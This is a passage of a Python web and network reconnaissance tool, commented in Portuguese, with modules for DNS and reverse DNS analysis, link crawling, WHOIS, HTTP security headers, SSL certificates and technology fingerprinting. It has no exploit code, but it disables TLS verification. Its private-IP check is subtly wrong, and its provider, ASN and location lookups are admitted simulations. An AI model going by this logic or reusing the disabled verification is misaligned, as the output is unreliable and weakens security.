        answers = dns.resolver.resolve(domain, 'A')
        if len(answers) > 5:  # Muitos registros A podem indicar round-robin vulnerável
            return "Possível round-robin vulnerável"
        return None
    except:
        return None

def _check_dnssec(domain):
    """Verifica se DNSSEC está configurado."""
    try:
        # Tenta resolver registro DNSKEY
        answers = dns.resolver.resolve(domain, 'DNSKEY')
        if answers:
            return "Ativo"
        return None
    except:
        return None

# --- MÓDULO 6B: ANÁLISE DE DNS REVERSO ---

def analyze_reverse_dns(ip_or_domain):
    """Realiza análise avançada de DNS reverso."""
    console.print("-" * 60)
    console.print(f"[*] Análise de DNS Reverso para: [bold cyan]{ip_or_domain}[/bold cyan]")
    console.print("-" * 60)
    
    # Determina se é IP ou domínio
    is_ip = _is_valid_ip(ip_or_domain)
    
    if is_ip:
        ips_to_analyze = [ip_or_domain]
    else:
        # Resolve domínio para IPs
        ips_to_analyze = _resolve_domain_to_ips(ip_or_domain)
        if not ips_to_analyze:
            console.print("[bold red][!] Não foi possível resolver o domínio.[/bold red]")
            return
    
    console.print(f"[*] Analisando {len(ips_to_analyze)} endereço(s) IP...")
    
    results = []
    for ip in ips_to_analyze:
        result = _perform_reverse_dns_analysis(ip)
        if result:
            results.append(result)
    
    if results:
        # Tabela de resultados
        table = Table(title="Análise de DNS Reverso")
        table.add_column("IP", style="cyan")
        table.add_column("Hostname", style="magenta")
        table.add_column("Provedor", style="yellow")
        table.add_column("Localização", style="green")
        table.add_column("ASN", style="blue")
        
        for result in results:
            table.add_row(
                result['ip'],
                result['hostname'] or "N/A",
                result['provider'] or "Desconhecido",
                result['location'] or "N/A",
                result['asn'] or "N/A"
            )
        
        console.print(table)
        
        # Análise de segurança
        _analyze_reverse_dns_security(results)
    else:
        console.print("[bold yellow][-] Nenhuma informação de DNS reverso encontrada.[/bold yellow]")
    
    console.print("-" * 60)

def _is_valid_ip(ip_string):
    """Verifica se uma string é um IP válido."""
    try:
        socket.inet_aton(ip_string)
        return True
    except socket.error:
        return False

def _resolve_domain_to_ips(domain):
    """Resolve um domínio para lista de IPs."""
    ips = []
    try:
        # A records
        answers = dns.resolver.resolve(domain, 'A')
        for rdata in answers:
            ips.append(str(rdata))
        
        # AAAA records (IPv6)
        try:
            answers_v6 = dns.resolver.resolve(domain, 'AAAA')
            for rdata in answers_v6:
                ips.append(str(rdata))
        except:
            pass
            
    except:
        pass
    
    return ips

def _perform_reverse_dns_analysis(ip):
    """Realiza análise completa de DNS reverso para um IP."""
    result = {
        'ip': ip,
        'hostname': None,
        'provider': None,
        'location': None,
        'asn': None
    }
    
    # DNS reverso básico
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        result['hostname'] = hostname
    except:
        pass
    
    # Identificação do provedor
    result['provider'] = _identify_ip_provider(ip)
    
    # Análise de ASN (simulado - normalmente usaria APIs externas)
    result['asn'] = _get_asn_info(ip)
    
    # Localização (simulado)
    result['location'] = _get_ip_location(ip)
    
    return result

def _identify_ip_provider(ip):
    """Identifica provedor baseado no IP."""
    # Ranges conhecidos de provedores
    provider_ranges = {
        '8.8.': 'Google DNS',
        '1.1.': 'Cloudflare DNS',
        '208.67.': 'OpenDNS',
        '9.9.': 'Quad9',
        '64.6.': 'Verisign',
        '104.16.': 'Cloudflare',
        '104.17.': 'Cloudflare',
        '172.64.': 'Cloudflare',
        '13.107.': 'Microsoft',
        '20.': 'Microsoft Azure',
        '40.': 'Microsoft Azure',
        '52.': 'Amazon AWS',
        '54.': 'Amazon AWS',
        '3.': 'Amazon AWS',
        '18.': 'Amazon AWS',
        '35.': 'Google Cloud',
        '34.': 'Google Cloud'
    }
    
    for ip_prefix, provider in provider_ranges.items():
        if ip.startswith(ip_prefix):
            return provider
    
    # Verifica se é IP privado
    if (_is_private_ip(ip)):
        return "Rede Privada"
    
    return None

def _is_private_ip(ip):
    """Verifica se IP é privado."""
    private_ranges = [
        ('10.', '10.255.255.255'),
        ('172.16.', '172.31.255.255'),
        ('192.168.', '192.168.255.255'),
        ('127.', '127.255.255.255')
    ]
    
    for start, end in private_ranges:
        if ip.startswith(start.split('.')[0]):
            return True
    return False

def _get_asn_info(ip):
    """Obtém informações de ASN (simulado)."""
    # Em implementação real, usaria APIs como IPWhois ou bgpview.io
    # Aqui simulamos alguns ASNs conhecidos
    asn_patterns = {
        '8.8.': 'AS15169 Google',
        '1.1.': 'AS13335 Cloudflare',
        '208.67.': 'AS36692 OpenDNS',
        '104.16.': 'AS13335 Cloudflare',
        '52.': 'AS16509 Amazon',
        '35.': 'AS15169 Google'
    }
    
    for ip_prefix, asn in asn_patterns.items():
        if ip.startswith(ip_prefix):
            return asn
    
    return None

def _get_ip_location(ip):
    """Obtém localização do IP (simulado)."""
    # Em implementação real, usaria APIs de geolocalização
    # Aqui simulamos algumas localizações conhecidas
    location_patterns = {
        '8.8.': 'Estados Unidos',
        '1.1.': 'Estados Unidos',
        '208.67.': 'Estados Unidos',
        '104.16.': 'Global (CDN)',
        '52.': 'Estados Unidos',
        '35.': 'Estados Unidos'
    }
    
    for ip_prefix, location in location_patterns.items():
        if ip.startswith(ip_prefix):
            return location
    
    return None

def _analyze_reverse_dns_security(results):
    """Analisa aspectos de segurança do DNS reverso."""
    console.print("\n[bold cyan]🔍 ANÁLISE DE SEGURANÇA[/bold cyan]")
    console.print("-" * 40)
    
    security_issues = []
    
    for result in results:
        ip = result['ip']
        hostname = result['hostname']
        
        # Verifica DNS reverso ausente
        if not hostname:
            security_issues.append(f"[yellow]IP {ip}: DNS reverso não configurado[/yellow]")
        
        # Verifica hostname suspeito
        elif hostname and _is_suspicious_hostname(hostname):
            security_issues.append(f"[red]IP {ip}: Hostname suspeito - {hostname}[/red]")
        
        # Verifica mismatch forward/reverse
        if hostname and not _verify_forward_reverse_match(ip, hostname):
            security_issues.append(f"[yellow]IP {ip}: Mismatch forward/reverse DNS[/yellow]")
    
    if security_issues:
        console.print("[bold red]⚠️  Problemas de segurança encontrados:[/bold red]")
        for issue in security_issues:
            console.print(f"    • {issue}")
    else:
        console.print("[green]✅ Nenhum problema de segurança detectado[/green]")

def _is_suspicious_hostname(hostname):
    """Verifica se hostname é suspeito."""
    suspicious_patterns = [
        'malware', 'phishing', 'spam', 'botnet', 'trojan',
        'virus', 'exploit', 'hack', 'attack', 'evil'
    ]
    
    hostname_lower = hostname.lower()
    return any(pattern in hostname_lower for pattern in suspicious_patterns)

def _verify_forward_reverse_match(ip, hostname):
    """Verifica se forward e reverse DNS coincidem."""
    try:
        forward_ips = socket.gethostbyname_ex(hostname)[2]
        return ip in forward_ips
    except:
        return False

# --- MÓDULO 7: COLETOR DE LINKS ---

def normalize_url(url):
    """Normaliza uma URL removendo fragmentos e barras finais."""
    p = urlparse(url)
    path = p.path.rstrip('/') if len(p.path) > 1 else p.path
    return urlunparse((p.scheme, p.netloc, path, p.params, p.query, '')).lower()

def crawl_links(base_url, max_depth=2, output_file=None):
    """Coleta todos os links e recursos de uma página web, respeitando o domínio original."""
    console.print("-" * 60)
    console.print(f"[*] A iniciar o crawling em: [bold cyan]{base_url}[/bold cyan]")
    console.print(f"[*] Profundidade máxima: [bold cyan]{max_depth}[/bold cyan]")
    console.print("-" * 60)

    to_visit = [(base_url, 0)]
    visited_normalized = set()
    all_resources = set()
    base_netloc = urlparse(base_url).netloc
    tag_attrs = {'a': 'href', 'script': 'src', 'link': 'href', 'img': 'src', 'source': 'src'}
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("[green]Crawling...", total=None)
        while to_visit:
            current_url, depth = to_visit.pop(0)
            normalized_url = normalize_url(current_url)

            if normalized_url in visited_normalized or depth > max_depth:
                continue
                
            visited_normalized.add(normalized_url)
            progress.update(task, advance=1, description=f"Visitando: {current_url[:70]}...")

            try:
                response = requests.get(current_url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
                
                for tag, attr in tag_attrs.items():
                    for t in soup.find_all(tag, **{attr: True}):
                        resource_link = t[attr]
                        full_url = urljoin(current_url, resource_link)
                        parsed_full_url = urlparse(full_url)
                        
                        if parsed_full_url.scheme in ['http', 'https']:
                            all_resources.add(full_url)
                            if tag == 'a' and parsed_full_url.netloc == base_netloc:
                                normalized_found_url = normalize_url(full_url)
                                if normalized_found_url not in visited_normalized:
                                    to_visit.append((full_url, depth + 1))
                                    
            except requests.RequestException as e:
                console.print(f"\n[bold red][!] Erro ao aceder a {current_url}: {e}[/bold red]")

    console.print("-" * 60)
    console.print(f"[*] Crawling concluído. Encontrados {len(all_resources)} recursos únicos.")
    
    sorted_resources = sorted(list(all_resources))
    
    if sorted_resources:
        table = Table(title=f"Recursos Encontrados em {base_url}")
        table.add_column("Recurso Encontrado", style="cyan")
        for link in sorted_resources:
            table.add_row(link)
        console.print(table)
        
        if output_file:
            try:
                with open(output_file, 'w', encoding='utf-8') as f:
                    for link in sorted_resources:
                        f.write(link + '\n')
                console.print(f"\n[bold green][+] Resultados salvos em: {output_file}[/bold green]")
            except IOError as e:
                console.print(f"\n[bold red][!] Erro ao salvar o arquivo: {e}[/bold red]")
    else:
        console.print("[bold yellow][-] Nenhum recurso encontrado.[/bold yellow]")
    console.print("-" * 60)

# --- MÓDULO 8: CONSULTA WHOIS ---

def get_whois_info(domain):
    """Obtém e exibe informações WHOIS para um domínio com análise de datas."""
    console.print("-" * 60)
    console.print(f"[*] Obtendo informações WHOIS para: [bold cyan]{domain}[/bold cyan]")
    console.print("-" * 60)
    try:
        with console.status(f"[bold green]Consultando servidor WHOIS para {domain}...[/bold green]"):
            w = whois.whois(domain)

        if not w.domain_name:
            console.print(f"[bold yellow][-] Nenhuma informação WHOIS encontrada para {domain}.[/bold yellow]")
            return

        table = Table(title=f"Informações WHOIS para {w.domain_name[0] if isinstance(w.domain_name, list) else w.domain_name}")
        table.add_column("Campo", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")

        def format_date_entry(date_value):
            if not date_value:
                return "N/A"
            date_obj = date_value[0] if isinstance(date_value, list) else date_value
            now = datetime.now()
            delta = abs(now - date_obj)
            
            if delta.days > 365:
                years = delta.days // 365
                months = (delta.days % 365) // 30
                duration = f"{years} anos e {months} meses"
            else:
                duration = f"{delta.days} dias"
            
            if date_obj > now:
                return f"{date_obj.strftime('%Y-%m-%d')} ([bold green]em {duration}[/bold green])"
            else:
                return f"{date_obj.strftime('%Y-%m-%d')} ([bold blue]{duration} atrás[/bold blue])"

        info_map = {
            "Domínio": w.domain_name, "Registrador": w.registrar, "Data de Criação": format_date_entry(w.creation_date),
            "Data de Expiração": format_date_entry(w.expiration_date), "Última Atualização": format_date_entry(w.updated_date),
            "Servidores de Nomes": w.name_servers, "Status": w.status, "E-mail (Admin)": w.emails,
        }

        for field, value in info_map.items():
            if value:
                value_str = "\n".join(map(str, value)) if isinstance(value, list) else str(value)
                table.add_row(field, value_str)
        
        console.print(table)

    except whois.parser.PywhoisError:
        console.print(f"[bold red][!] Erro: Não foi possível analisar a resposta WHOIS para '{domain}'. O domínio pode não ser válido ou o TLD não é suportado.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado ao consultar o WHOIS: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 9: ANÁLISE DE CABEÇALHOS HTTP ---

def get_http_headers(url, return_findings=False):
    """Obtém, exibe e analisa os cabeçalhos de resposta HTTP de uma URL."""
    if not return_findings:
        console.print("-" * 60)
        console.print(f"[*] Analisando cabeçalhos HTTP de: [bold cyan]{url}[/bold cyan]")
        console.print("-" * 60)
    
    findings = []
    
    try:
        with console.status("[bold green]Obtendo cabeçalhos HTTP...[/bold green]", spinner="dots"):
            response = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, allow_redirects=True, verify=False)
        final_url = response.url
        
        if not return_findings:
            if response.history:
                console.print(f"[yellow][*] Requisição redirecionada. Analisando URL final:[bold cyan] {final_url}[/bold cyan][/yellow]")
            console.print(f"[*] Status: [bold { 'green' if response.ok else 'red' }]{response.status_code} {response.reason}[/bold { 'green' if response.ok else 'red' }]")
            console.print("-" * 60)

        headers = response.headers
        
        if not return_findings:
            table = Table(title=f"Cabeçalhos HTTP de {final_url}")
            table.add_column("Cabeçalho", style="cyan")
            table.add_column("Valor", style="magenta")
            info_disclosure_headers = ["server", "x-powered-by", "x-aspnet-version"]
            for header, value in headers.items():
                style = "yellow" if header.lower() in info_disclosure_headers else "magenta"
                table.add_row(header, f"[{style}]{value}[/{style}]")
            console.print(table)
        
        security_headers = {
            "Strict-Transport-Security": "Força o uso de HTTPS, protegendo contra ataques de downgrade.",
            "Content-Security-Policy": "Previne ataques de XSS (Cross-Site Scripting).",
            "X-Frame-Options": "Protege contra ataques de clickjacking.",
            "X-Content-Type-Options": "Previne ataques de 'MIME sniffing'.",
            "Referrer-Policy": "Controla quanta informação de referência é enviada.",
            "Permissions-Policy": "Controla quais recursos do navegador a página pode usar."
        }
        
        for header, desc in security_headers.items():
            if header not in headers:
                findings.append({
                    "Risco": "Baixo", "Tipo": "Cabeçalho de Segurança Ausente",
                    "Detalhe": f"O cabeçalho '{header}' está ausente.", "Recomendação": desc
                })

        if return_findings:
            return findings

        sec_table = Table(title="Status dos Cabeçalhos de Segurança")
        sec_table.add_column("Cabeçalho de Segurança", style="cyan")
        sec_table.add_column("Status", style="magenta")
        sec_table.add_column("Recomendação", style="white")

        for header, desc in security_headers.items():
            if header in headers:
                sec_table.add_row(header, "[bold green]Presente[/bold green]", headers[header])
            else:
                sec_table.add_row(header, "[bold red]Ausente[/bold red]", desc)
        console.print("\n[*] [bold]Análise de Cabeçalhos de Segurança[/bold]")
        console.print(sec_table)

    except requests.exceptions.ConnectionError:
        if not return_findings: console.print(f"[bold red][!] Erro de Conexão: Não foi possível conectar a '{url}'.[/bold red]")
    except requests.RequestException as e:
        if not return_findings: console.print(f"[bold red][!] Erro ao obter a URL: {e}[/bold red]")
    
    if not return_findings:
        console.print("-" * 60)
    
    return findings

# --- MÓDULO 10: ANÁLISE DE CERTIFICADO SSL/TLS ---

def get_ssl_info(hostname, port=443):
    """Obtém e exibe informações do certificado SSL/TLS."""
    console.print("-" * 60)
    console.print(f"[*] Analisando certificado SSL/TLS de: [bold cyan]{hostname}:{port}[/bold cyan]")
    console.print("-" * 60)

    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        with console.status(f"[bold green]Conectando e obtendo certificado de {hostname}...[/bold green]"):
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert_der = ssock.getpeercert(True)
        
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1, cert_der)

        table = Table(title=f"Informações do Certificado SSL/TLS para {hostname}")
        table.add_column("Campo", style="cyan", no_wrap=True)
        table.add_column("Valor", style="magenta")

        # --- Assunto e Emissor ---
        subject_str = "\n".join([f"{key.decode()}: {value.decode()}" for key, value in x509.get_subject().get_components()])
        issuer_str = "\n".join([f"{key.decode()}: {value.decode()}" for key, value in x509.get_issuer().get_components()])
        table.add_row("Assunto", subject_str)
        table.add_row("Emissor", issuer_str)
        
        # --- Verificação de Autoassinado ---
        if x509.get_subject().get_components() == x509.get_issuer().get_components():
            table.add_row("Confiança", "[bold yellow]Certificado Autoassinado (Não confiável)[/bold yellow]")

        # --- Validade ---
        valid_from = datetime.strptime(x509.get_notBefore().decode('ascii'), '%Y%m%d%H%M%SZ')
        valid_to = datetime.strptime(x509.get_notAfter().decode('ascii'), '%Y%m%d%H%M%SZ')
        table.add_row("Válido De", valid_from.strftime('%Y-%m-%d %H:%M:%S'))
        status_expiracao = f"[bold red]Expirado em {valid_to.strftime('%Y-%m-%d %H:%M:%S')}[/bold red]" if x509.has_expired() else f"[bold green]Válido até {valid_to.strftime('%Y-%m-%d %H:%M:%S')}[/bold green]"
        table.add_row("Validade", status_expiracao)

        # --- Detalhes Criptográficos ---
        pubkey = x509.get_pubkey()
        key_type = "RSA" if pubkey.type() == crypto.TYPE_RSA else "ECC" if pubkey.type() == crypto.TYPE_EC else "Outro"
        table.add_row("Chave Pública", f"{key_type} ({pubkey.bits()} bits)")
        table.add_row("Algoritmo de Assinatura", x509.get_signature_algorithm().decode('utf-8'))
        table.add_row("Nº de Série", str(x509.get_serial_number()))
        
        # --- Nomes Alternativos (SAN) ---
        san_list = []
        for i in range(x509.get_extension_count()):
            ext = x509.get_extension(i)
            if 'subjectAltName' in str(ext.get_short_name()):
                san_list = [name.strip().replace("DNS:", "") for name in str(ext).split(',')]
        if san_list:
            table.add_row("Nomes Alternativos (SAN)", "\n".join(san_list))

        console.print(table)

    except socket.gaierror:
        console.print(f"[bold red][!] Erro: O nome do host '{hostname}' não pôde ser resolvido.[/bold red]")
    except socket.timeout:
        console.print(f"[bold red][!] Erro: Tempo de conexão esgotado para '{hostname}:{port}'.[/bold red]")
    except ConnectionRefusedError:
        console.print(f"[bold red][!] Erro: Conexão recusada por '{hostname}:{port}'.[/bold red]")
    except ssl.SSLError as e:
        console.print(f"[bold red][!] Erro de SSL: {e}.[/bold red]")
    except Exception as e:
        console.print(f"[bold red][!] Ocorreu um erro inesperado: {e}[/bold red]")
    console.print("-" * 60)

# --- MÓDULO 11: DETECÇÃO DE TECNOLOGIAS ---

# --- MÓDULO 11: DETECÇÃO AVANÇADA DE TECNOLOGIAS WEB ---

class AdvancedTechnologyDetector:
    def __init__(self, url, timeout=10, retries=3):
        self.url = url
        self.timeout = timeout
        self.retries = retries
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Resultados estruturados com confiança
        self.detections = {
            'web_servers': [],
            'frontend_frameworks': [],
            'backend_technologies': [],
            'cms_platforms': [],
            'javascript_libraries': [],
            'css_frameworks': [],
            'cdn_services': [],
            'security_technologies': [],
            'analytics_tools': [],
            'development_tools': [],
            'databases': [],
            'cloud_services': []
        }
        
        # Database extenso de tecnologias
        self._init_technology_database()
    
    def _init_technology_database(self):
        """Inicializa database completo de tecnologias."""
        self.tech_database = {
            'headers': {
                # Web Servers
                'Server': {
                    'nginx': {'name': 'Nginx', 'category': 'web_servers', 'version_regex': r'nginx/(\d+\.\d+\.\d+)'},
                    'apache': {'name': 'Apache HTTP Server', 'category': 'web_servers', 'version_regex': r'Apache/(\d+\.\d+\.\d+)'},
                    'microsoft-iis': {'name': 'Microsoft IIS', 'category': 'web_servers', 'version_regex': r'Microsoft-IIS/(\d+\.\d+)'},
                    'litespeed': {'name': 'LiteSpeed', 'category': 'web_servers', 'version_regex': r'LiteSpeed/(\d+\.\d+\.\d+)'},
                    'caddy': {'name': 'Caddy', 'category': 'web_servers', 'version_regex': r'Caddy/(\d+\.\d+\.\d+)'},
                    'gunicorn': {'name': 'Gunicorn', 'category': 'web_servers', 'version_regex': r'gunicorn/(\d+\.\d+\.\d+)'},
                    'werkzeug': {'name': 'Werkzeug', 'category': 'development_tools', 'version_regex': r'Werkzeug/(\d+\.\d+\.\d+)'},
                    'cloudflare': {'name': 'Cloudflare', 'category': 'cdn_services', 'version_regex': None},
                    'openresty': {'name': 'OpenResty', 'category': 'web_servers', 'version_regex': r'openresty/(\d+\.\d+\.\d+)'},
                    'lighttpd': {'name': 'lighttpd', 'category': 'web_servers', 'version_regex': r'lighttpd/(\d+\.\d+\.\d+)'},
                    'envoy': {'name': 'Envoy', 'category': 'web_servers', 'version_regex': None},
                    'tomcat': {'name': 'Apache Tomcat', 'category': 'web_servers', 'version_regex': r'Apache-Coyote/(\d+\.\d+)'},
                    'jetty': {'name': 'Jetty', 'category': 'web_servers', 'version_regex': r'Jetty/(\d+\.\d+\.\d+)'},
                    'wildfly': {'name': 'WildFly', 'category': 'web_servers', 'version_regex': r'WildFly/(\d+\.\d+\.\d+)'},
                    'jboss': {'name': 'JBoss', 'category': 'web_servers', 'version_regex': r'JBoss/(\d+\.\d+\.\d+)'},
                    'glassfish': {'name': 'GlassFish', 'category': 'web_servers', 'version_regex': r'GlassFish/(\d+\.\d+)'},
                    'weblogic': {'name': 'Oracle WebLogic', 'category': 'web_servers', 'version_regex': r'WebLogic/(\d+\.\d+\.\d+)'},
                    'traefik': {'name': 'Traefik', 'category': 'web_servers', 'version_regex': r'Traefik/(\d+\.\d+\.\d+)'},
                    'haproxy': {'name': 'HAProxy', 'category': 'web_servers', 'version_regex': r'HAProxy/(\d+\.\d+\.\d+)'},
                    'kong': {'name': 'Kong Gateway', 'category': 'web_servers', 'version_regex': r'Kong/(\d+\.\d+\.\d+)'},
                    'istio': {'name': 'Istio', 'category': 'web_servers', 'version_regex': None},
                    'linkerd': {'name': 'Linkerd', 'category': 'web_servers', 'version_regex': None},
                    'consul': {'name': 'Consul', 'category': 'web_servers', 'version_regex': None},
                    'varnish': {'name': 'Varnish', 'category': 'web_servers', 'version_regex': r'varnish/(\d+\.\d+\.\d+)'},
                    'squid': {'name': 'Squid', 'category': 'web_servers', 'version_regex': r'squid/(\d+\.\d+\.\d+)'},
                    'cherokee': {'name': 'Cherokee', 'category': 'web_servers', 'version_regex': r'Cherokee/(\d+\.\d+\.\d+)'},
                    'mongoose': {'name': 'Mongoose', 'category': 'web_servers', 'version_regex': r'Mongoose/(\d+\.\d+)'},
                    'thttpd': {'name': 'thttpd', 'category': 'web_servers', 'version_regex': r'thttpd/(\d+\.\d+\.\d+)'},
                    'yaws': {'name': 'Yaws', 'category': 'web_servers', 'version_regex': r'Yaws/(\d+\.\d+)'},
                    'hiawatha': {'name': 'Hiawatha', 'category': 'web_servers', 'version_regex': r'Hiawatha/(\d+\.\d+)'},
                    'bfe': {'name': 'BFE', 'category': 'web_servers', 'version_regex': None},
                    'apisix': {'name': 'Apache APISIX', 'category': 'web_servers', 'version_regex': None},
                    'tengine': {'name': 'Tengine', 'category': 'web_servers', 'version_regex': r'Tengine/(\d+\.\d+\.\d+)'},
                    'angie': {'name': 'Angie', 'category': 'web_servers', 'version_regex': r'Angie/(\d+\.\d+\.\d+)'},
                    'unit': {'name': 'NGINX Unit', 'category': 'web_servers', 'version_regex': r'Unit/(\d+\.\d+\.\d+)'},
                    'puma': {'name': 'Puma', 'category': 'web_servers', 'version_regex': r'Puma/(\d+\.\d+\.\d+)'},
                    'unicorn': {'name': 'Unicorn', 'category': 'web_servers', 'version_regex': r'Unicorn/(\d+\.\d+\.\d+)'},
                    'passenger': {'name': 'Passenger', 'category': 'web_servers', 'version_regex': r'Passenger/(\d+\.\d+\.\d+)'},
                    'thin': {'name': 'Thin', 'category': 'web_servers', 'version_regex': r'thin/(\d+\.\d+\.\d+)'},
                    'webrick': {'name': 'WEBrick', 'category': 'web_servers', 'version_regex': r'WEBrick/(\d+\.\d+\.\d+)'},
                    'mongrel': {'name': 'Mongrel', 'category': 'web_servers', 'version_regex': r'Mongrel/(\d+\.\d+\.\d+)'},
                    'waitress': {'name': 'Waitress', 'category': 'web_servers', 'version_regex': r'waitress/(\d+\.\d+\.\d+)'},
                    'cherrypy': {'name': 'CherryPy', 'category': 'web_servers', 'version_regex': r'CherryPy/(\d+\.\d+\.\d+)'},
                    'tornado': {'name': 'Tornado', 'category': 'web_servers', 'version_regex': r'TornadoServer/(\d+\.\d+\.\d+)'},
                    'hypercorn': {'name': 'Hypercorn', 'category': 'web_servers', 'version_regex': r'Hypercorn/(\d+\.\d+\.\d+)'},
                    'uvicorn': {'name': 'Uvicorn', 'category': 'web_servers', 'version_regex': r'uvicorn/(\d+\.\d+\.\d+)'},
                    'daphne': {'name': 'Daphne', 'category': 'web_servers', 'version_regex': r'Daphne/(\d+\.\d+\.\d+)'},
                    'asgi': {'name': 'ASGI Server', 'category': 'web_servers', 'version_regex': None},
                    'wsgi': {'name': 'WSGI Server', 'category': 'web_servers', 'version_regex': None},
                    'kestrel': {'name': 'Kestrel', 'category': 'web_servers', 'version_regex': r'Kestrel/(\d+\.\d+\.\d+)'},
                    'http.sys': {'name': 'HTTP.sys', 'category': 'web_servers', 'version_regex': None},
                    'iis express': {'name': 'IIS Express', 'category': 'web_servers', 'version_regex': r'IIS Express/(\d+\.\d+)'},
                    'cassini': {'name': 'Cassini', 'category': 'web_servers', 'version_regex': None}
                },
                'X-Powered-By': {
                    'php': {'name': 'PHP', 'category': 'backend_technologies', 'version_regex': r'PHP/(\d+\.\d+\.\d+)'},
                    'asp.net': {'name': 'ASP.NET', 'category': 'backend_technologies', 'version_regex': r'ASP\.NET Version (\d+\.\d+\.\d+)'},
                    'express': {'name': 'Express.js', 'category': 'backend_technologies', 'version_regex': r'Express/(\d+\.\d+\.\d+)'},
                    'django': {'name': 'Django', 'category': 'backend_technologies', 'version_regex': r'Django/(\d+\.\d+\.\d+)'},
                    'rails': {'name': 'Ruby on Rails', 'category': 'backend_technologies', 'version_regex': r'Rails (\d+\.\d+\.\d+)'},
                    'laravel': {'name': 'Laravel', 'category': 'backend_technologies', 'version_regex': r'Laravel/(\d+\.\d+\.\d+)'},
                    'next.js': {'name': 'Next.js', 'category': 'frontend_frameworks', 'version_regex': r'Next\.js/(\d+\.\d+\.\d+)'},
                    'fastapi': {'name': 'FastAPI', 'category': 'backend_technologies', 'version_regex': None},
                    'flask': {'name': 'Flask', 'category': 'backend_technologies', 'version_regex': None},
                    'symfony': {'name': 'Symfony', 'category': 'backend_technologies', 'version_regex': None},
                    'rubyonrails': {'name': 'Ruby on Rails', 'category': 'backend_technologies', 'version_regex': None},
                    'aspnet': {'name': 'ASP.NET', 'category': 'backend_technologies', 'version_regex': None},
                    'spring': {'name': 'Spring Boot', 'category': 'backend_technologies', 'version_regex': None},
                    'node.js': {'name': 'Node.js', 'category': 'backend_technologies', 'version_regex': r'Node\.js/(\d+\.\d+\.\d+)'},
                    'python': {'name': 'Python', 'category': 'backend_technologies', 'version_regex': r'Python/(\d+\.\d+\.\d+)'},
                    'ruby': {'name': 'Ruby', 'category': 'backend_technologies', 'version_regex': r'Ruby/(\d+\.\d+\.\d+)'},
                    'java': {'name': 'Java', 'category': 'backend_technologies', 'version_regex': r'Java/(\d+\.\d+\.\d+)'},
                    'go': {'name': 'Go', 'category': 'backend_technologies', 'version_regex': r'Go/(\d+\.\d+\.\d+)'},
                    'rust': {'name': 'Rust', 'category': 'backend_technologies', 'version_regex': r'Rust/(\d+\.\d+\.\d+)'},
                    'scala': {'name': 'Scala', 'category': 'backend_technologies', 'version_regex': r'Scala/(\d+\.\d+\.\d+)'},
                    'kotlin': {'name': 'Kotlin', 'category': 'backend_technologies', 'version_regex': r'Kotlin/(\d+\.\d+\.\d+)'},
                    'elixir': {'name': 'Elixir', 'category': 'backend_technologies', 'version_regex': r'Elixir/(\d+\.\d+\.\d+)'},
                    'phoenix': {'name': 'Phoenix Framework', 'category': 'backend_technologies', 'version_regex': r'Phoenix/(\d+\.\d+\.\d+)'},
                    'gin': {'name': 'Gin', 'category': 'backend_technologies', 'version_regex': r'Gin/(\d+\.\d+\.\d+)'},
                    'echo': {'name': 'Echo', 'category': 'backend_technologies', 'version_regex': r'Echo/(\d+\.\d+\.\d+)'},
                    'fiber': {'name': 'Fiber', 'category': 'backend_technologies', 'version_regex': r'Fiber/(\d+\.\d+\.\d+)'},
                    'actix': {'name': 'Actix Web', 'category': 'backend_technologies', 'version_regex': r'Actix/(\d+\.\d+\.\d+)'},
                    'rocket': {'name': 'Rocket', 'category': 'backend_technologies', 'version_regex': r'Rocket/(\d+\.\d+\.\d+)'},
                    'warp': {'name': 'Warp', 'category': 'backend_technologies', 'version_regex': r'Warp/(\d+\.\d+\.\d+)'},
                    'axum': {'name': 'Axum', 'category': 'backend_technologies', 'version_regex': r'Axum/(\d+\.\d+\.\d+)'},
                    'koa': {'name': 'Koa.js', 'category': 'backend_technologies', 'version_regex': r'Koa/(\d+\.\d+\.\d+)'},
                    'hapi': {'name': 'Hapi.js', 'category': 'backend_technologies', 'version_regex': r'Hapi/(\d+\.\d+\.\d+)'},
                    'fastify': {'name': 'Fastify', 'category': 'backend_technologies', 'version_regex': r'Fastify/(\d+\.\d+\.\d+)'},
                    'nestjs': {'name': 'NestJS', 'category': 'backend_technologies', 'version_regex': r'NestJS/(\d+\.\d+\.\d+)'},
                    'sails': {'name': 'Sails.js', 'category': 'backend_technologies', 'version_regex': r'Sails/(\d+\.\d+\.\d+)'},
                    'meteor': {'name': 'Meteor', 'category': 'backend_technologies', 'version_regex': r'Meteor/(\d+\.\d+\.\d+)'},
                    'adonis': {'name': 'AdonisJS', 'category': 'backend_technologies', 'version_regex': r'AdonisJS/(\d+\.\d+\.\d+)'},
                    'sinatra': {'name': 'Sinatra', 'category': 'backend_technologies', 'version_regex': r'Sinatra/(\d+\.\d+\.\d+)'},
                    'padrino': {'name': 'Padrino', 'category': 'backend_technologies', 'version_regex': r'Padrino/(\d+\.\d+\.\d+)'},
                    'hanami': {'name': 'Hanami', 'category': 'backend_technologies', 'version_regex': r'Hanami/(\d+\.\d+\.\d+)'},
                    'grape': {'name': 'Grape', 'category': 'backend_technologies', 'version_regex': r'Grape/(\d+\.\d+\.\d+)'},
                    'cuba': {'name': 'Cuba', 'category': 'backend_technologies', 'version_regex': r'Cuba/(\d+\.\d+\.\d+)'},
                    'zend': {'name': 'Zend Framework', 'category': 'backend_technologies', 'version_regex': r'Zend/(\d+\.\d+\.\d+)'},
                    'laminas': {'name': 'Laminas', 'category': 'backend_technologies', 'version_regex': r'Laminas/(\d+\.\d+\.\d+)'},
